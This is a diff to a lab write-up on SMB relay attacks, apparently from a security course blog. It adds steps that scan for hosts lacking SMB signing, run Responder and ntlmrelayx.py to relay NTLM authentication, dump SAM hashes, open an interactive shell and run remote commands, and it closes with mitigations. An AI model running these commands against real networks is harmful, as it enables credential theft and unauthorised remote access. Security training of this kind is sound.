@@ -170,6 +170,77 @@ ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
 
    ![Send Commands](/assets/images/tcm-academy/smb-relay-13.png)
 
+
+1. **Identify Hosts without SMB Signing Enabled and Enforced**: Scanned the network to find vulnerable hosts.
+
+    ```bash
+    nmap --script=smb2-security-mode.nse -p 445 <target IP address> -Pn
+    ```
+
+    ![Identify Hosts](/assets/images/tcm-academy/smb-relay-2.png)
+
+2. **Create a targets file**:
+
+    ```bash
+    sudo nano target.txt
+    ```
+
+    ![Create Targets File](/assets/images/tcm-academy/smb-relay-3.png)
+
+3. **Configure Responder to Relay Requests**: Set up Responder to capture and relay SMB authentication requests.
+
+    ```bash
+    sudo mousepad /etc/responder/Responder.conf
+    ```
+
+    ![Configure Responder](/assets/images/tcm-academy/smb-relay-4.png)
+
+    Switch off SMB and HTTP:
+
+    <img src="/assets/images/tcm-academy/smb-relay-5.png">
+
+4. **Run Responder**: Executed Responder to listen for SMB authentication attempts.
+
+    ```bash
+    sudo responder -I eth0
+    ```
+
+    ![Run Responder](/assets/images/tcm-academy/smb-relay-6.png)
+
+5. **Setup NTLM Relay X**: Configured NTLM Relay X to relay captured credentials to the target server.
+
+    ```bash
+    sudo python3 ntlmrelayx.py -smb2support -tf targets.txt
+    ```
+
+    ![Setup Relay X](/assets/images/tcm-academy/smb-relay-7.png)
+
+6. **Triggering Event**: Captured SMB authentication request when a user tried to access a network resource.
+
+    ![Triggering Event](/assets/images/tcm-academy/smb-relay-8.png)
+    <img src="/assets/images/tcm-academy/smb-relay-9.png">
+
+7. **Dump SAM Hashes**: Relayed the authentication request and dumped the hashes from the SAM database.
+
+    ![Dump SAM Hashes](/assets/images/tcm-academy/smb-relay-10.png)
+
+8. **Interactive Shell**: Created an interactive shell using the `-i` command.
+
+    ```bash
+    ntlmrelayx.py -tf targets.txt -smb2support -i
+    ```
+
+    ![Interactive Shell](/assets/images/tcm-academy/smb-relay-11.png)
+    <img src="/assets/images/tcm-academy/smb-relay-12.png">
+
+9. **Send Commands**: Sent specific commands to the target system using the `-c` option.
+
+    ```bash
+    ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+    ```
+
+    ![Send Commands](/assets/images/tcm-academy/smb-relay-13.png)
+
 ## Conclusion
 
 Understanding and mitigating SMB Relay attacks is critical for maintaining the security of networked systems. By enforcing SMB signing, disabling SMBv1, using strong authentication methods, segmenting the network, keeping systems updated, and monitoring network activities, organizations can significantly reduce the risk of such attacks. The lab demonstration provided practical insights into how these attacks are executed and the importance of implementing robust security measures.
